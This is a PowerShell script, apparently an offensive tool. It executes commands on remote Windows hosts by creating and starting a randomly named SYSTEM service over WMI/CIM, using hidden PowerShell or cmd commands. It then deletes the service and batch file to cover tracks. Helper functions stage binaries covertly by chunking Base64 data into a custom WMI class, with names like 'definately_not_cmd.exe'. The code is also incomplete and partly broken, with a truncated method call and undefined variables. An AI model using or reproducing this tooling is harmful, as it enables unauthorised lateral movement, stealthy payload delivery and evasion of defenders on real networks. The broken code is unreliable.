<#
    $pass = ConvertTo-SecureString “Password” -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential (“username”, $pass)
#>
################################################################################
# Add MaxEnvelopeSize 
# Add Exe file Copying
################################################################################

Function Invoke-PsExecWmi {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$ComputerName,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [pscredential]$Credential,
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$Command,
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$File,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [switch]$PowerShellWrite,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [switch]$BatchWrite,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [switch]$ServicePathFolder = "C:\Windows\temp"
    )

    Begin {
        Write-Verbose "Opening CimSession"
        $CimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential

        $errorControl = [byte] 1
        $serviceType = [byte] 16
        $Random = -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
        Write-Verbose "Using FileName $Random"

        if ($PowerShellWrite) {
            $PsCommand = "powershell.exe -V 2 -NoP -NoL -NonI -W Hidden -Command Set-Content -Path C:\Windows\temp\$random.bat -Value `'$payload`'"
        } elseif ($BatchWrite) {
            $CmdCommand = "cmd.exe /c echo $Payload > C:\Windows\temp\$Random.bat"
        }
    } Process {
        if ($File) {
            New-WMIClass -ClassName PsExecWmi -ComputerName $ComputerName -Credential $Credential
            Get-WMILength -ClassName PsExecWmi -ComputerName $ComputerName -Credential $Credential
            $EncodedBytes = ConvertTo-Base64 -FileName $File
            Invoke-InsertFile -EncodedText $EncodedBytes -FileName $Random -ClassName PsExecWmi
            Invoke-WmiMethod -
        } elseif($PsCommand -or $CmdCommand) {
            Write-Verbose "Creating Remote File $ServicePath\$Random.bat"
            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
                CommandLine = $PsCommand
            } -CimSession $CimSession
        }
        Write-Verbose "Creating Remote Service $Random"
        $Service = Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{
            DesktopInteract = $false
            DisplayName = $Random
            ErrorControl = $errorControl
            Name = $Random
            PathName = "cmd.exe /c start /b $ServicePath\$Random.bat"
            ServiceType = $serviceType
            StartMode = "Manual"
            StartName = "NT AUTHORITY\SYSTEM"
            StartPassword = ""
        } -CimSession $CimSession

        $Service = Get-CimInstance -ClassName Win32_Service -Filter "Name = '$Random'"
        Write-Verbose "Starting Service"
        $Service | Invoke-CIMMethod -Name StartService
    } End {
        Write-Verbose "Stoping Service"
        $Service | Invoke-CIMMethod -Name StopService
        Write-Verbose "Deleting Service"
        $Service | Invoke-CIMMethod -Name Delete
        Write-Verbose "Deleting File"
        $File = Get-CimInstance -Query "SELECT * FROM CIM_DataFile WHERE Name = 'C:\\Windows\\temp\\$Random.bat'" -CimSession $CimSession
        $File.Delete()
    }
}

################################################################################
# Create a new WMI Class
################################################################################
Function New-WMIClass {
<#
	.SYNOPSIS
	Creates a new WMI class to be used to store files
	.PARAMETER ClassName
	Name of class to create.
	.EXAMPLE
	New-WMIClass -ClassName WMIFS
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Host to create class on.")]
            [string]$ComputerName = 'localhost',
        [Parameter(Mandatory=$false, HelpMessage="PowerShell Credential Object.")]
            [PSCredential]$Credential
    )
    Begin {
        $Options = New-Object System.Management.ConnectionOptions
        if ($Credential) {
            $Options.Username = $Credential.UserName
            $Options.SecurePassword = $Credential.Password
        }
        $Scope =  New-Object System.Management.ManagementScope("\\$Host\root\cimv2", $Options)
        $Class = New-Object System.Management.ManagementClass($Scope, [String]::Empty, $null); 
    } Process {
        $Class["__CLASS"] = $ClassName; 

        $Class.Qualifiers.Add("Static", $true)

        $Class.Properties.Add("FileStore", [System.Management.CimType]::String, $false)
        $Class.Properties["FileStore"].Qualifiers.Add("Key", $true)
        $Class.Properties["FileStore"].Qualifiers.Add("MaxLen", $([int32]::MaxValue - 1))

        $Class.Properties.Add("FileName", [System.Management.CimType]::String, $false)
        $Class.Properties["FileName"].Qualifiers.Add("Key", $true)

        $Class.Properties.Add("Index", [System.Management.CimType]::String, $false)
        $Class.Properties["Index"].Qualifiers.Add("Key", $true)
    } End {
        $Class.Put()
    }
}

################################################################################
# the length of a string allowed in can in inconsistent
################################################################################
Function Get-WMILength {
<#
	.SYNOPSIS
	Tests the max length of a string that can be inserted into the WMI Class
	.PARAMETER ClassName
	Name of Class to Test Against
	.EXAMPLE
	$length = Get-WMILength -Verbose -ClassName WMIFS
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="Name of Class to Test Against.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Host to connect to.")]
            [string]$ComputerName = 'localhost',
        [Parameter(Mandatory=$false, HelpMessage="PowerShell Credential Object.")]
            [PSCredential]$Credential
    )
    Begin {
        $a = "a"
        $error.Clear()
        $strlen = 0;
    } Process {
        try {
            ForEach($limit in $(8000 .. 9000)) {
                Write-Verbose "Testing Length $limit"; 
                $a = 'a' * $limit;
                $Insert = Set-WmiInstance -Class $ClassName -Arguments @{
                    FileStore = $a; 
                    FileName = "Limits"; 
                    Index = $limit;
                } -ComputerName $ComputerName -Credential $Credential | Out-Null
                #There has got to be a better way
                if ($error[0] -like "Quota violation*") {
                    $strlen = $limit;
                    Write-Output $($strlen - 1);
                    Break;
                }
            }
        } Catch {  
        } 
    } End { 
    }
}

################################################################################
# Convert the input file to Base64
################################################################################
Function ConvertTo-Base64 {
<#
	.SYNOPSIS
	Converts a file to a Base64 encoded string by reading it in as raw bytes
	.PARAMETER FileName
	Path to the File to convert
	.EXAMPLE
	$EncodedText = ConvertTo-Base64 -FileName "cmd.exe" -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Path to File.")]
            [string]$FileName
    )
    Begin {
    } Process {
        Write-Verbose "Reading $FileName"
        [byte[]]$File = Get-Content -Encoding Byte -Path $FileName
        Write-Verbose "Encoding $FileName"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($File)
        $EncodedText =[Convert]::ToBase64String($Bytes)
        Write-Verbose "Finished Encoding $FileName"
    } End {
        Write-Output $EncodedText
    }
}

################################################################################
# Insert the Base64 Encoded File into the WMI Class
################################################################################
Function Invoke-InsertFile {
<#
	.SYNOPSIS
	Slices a string into defined lengths and inserts it into a WMI class.
	.PARAMETER EncodedText
	The Base64 encoded text to insert.
	.PARAMETER FileName
	Name to identify the file in WMI. This value can be random.
	.PARAMETER ClassName
	Name of the WMI class to insert into.
	.EXAMPLE
	Invoke-InsertFile -EncodedText $EncodedText -FileName "definately_not_cmd.exe" -ClassName WMIFS -StrLen $length -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, 
            HelpMessage="Encoded Text to Insert",
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$true, HelpMessage="Name to identify the file in WMI.")]
            [string]$FileName,
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Allowed String Length")]
            [string]$StrLen = 8000,
        [Parameter(Mandatory=$false, HelpMessage="Host to connect to.")]
            [string]$ComputerName = 'localhost',
        [Parameter(Mandatory=$false, HelpMessage="PowerShell Credential Object.")]
            [PSCredential]$Credential
    )
    Begin {
        $index = 0
    } Process {
        For ($i = 0; $i -lt $EncodedText.Length; $i += $strlen) {
            Write-Verbose "Inserting Section: $i to $($i + $strlen)" 
            if ($($i + $strlen) -le $EncodedText.Length) {
                [string]$substring = $EncodedText.Substring($i, $strlen)
            } else {
                [string]$substring = $EncodedText.Substring($i, $($EncodedText.Length - $i))
            }
            Set-WmiInstance -Class $ClassName -Arguments @{
                FileStore = $Substring;
                FileName = $FileName; 
                Index = $index;
            } -ComputerName $ComputerName -Credential $Credential | Out-Null
            $index++;
        }
    } End {
    }
}

$code = @'
Function Invoke-RetrieveFile {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Name of File to Retrieve")]
            [string]$FileName,
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Host to connect to.")]
            [string]$ComputerName = 'localhost',
        [Parameter(Mandatory=$false, HelpMessage="PowerShell Credential Object.")]
            [PSCredential]$Credential
    )
    Begin {
    } Process {
        $query = Get-WmiObject -Query "SELECT * FROM $ClassName WHERE FileName LIKE '$FileName'" -ComputerName $ComputerName -Credential $Credential 
        [String]$FilePart = [String]::Empty
        For($j = 0; $j -lt $query.Count; $j++) {
            [String]$FileStore = $($query | ? Index -EQ $j).FileStore
            Write-Verbose "Reading Section $j ($($FileStore.Length))"
            $FilePart += $FileStore
        }
    } End {
        Write-Output $FilePart
    }
}
Function ConvertFrom-Base64 {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Text to Decode",
            ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$false, HelpMessage="Name of File to Convert")]
            [switch]$WriteToDisk,
		[Parameter(Mandatory=$false, HelpMessage="Name of File to Write Out")]
            [string]$FileName = "NothingToSeeHere.txt"
    )
    Begin {
    } Process {
        Write-Verbose "Decoding File"
        $DecodedText = [System.Convert]::FromBase64String($EncodedText)
        Write-Verbose "Finished Decoding File"
        [byte[]]$Output = ([System.Text.Encoding]::Unicode.GetString($DecodedText)) -split ' '
    } End {
		if ($WriteToDisk) {
			Write-Verbose "Writing File to Disk as $FileName"
			Set-Content -Path $FileName -Value $Output -Encoding Byte
		} else {
			Write-Output $Output
		}
    }
}
'@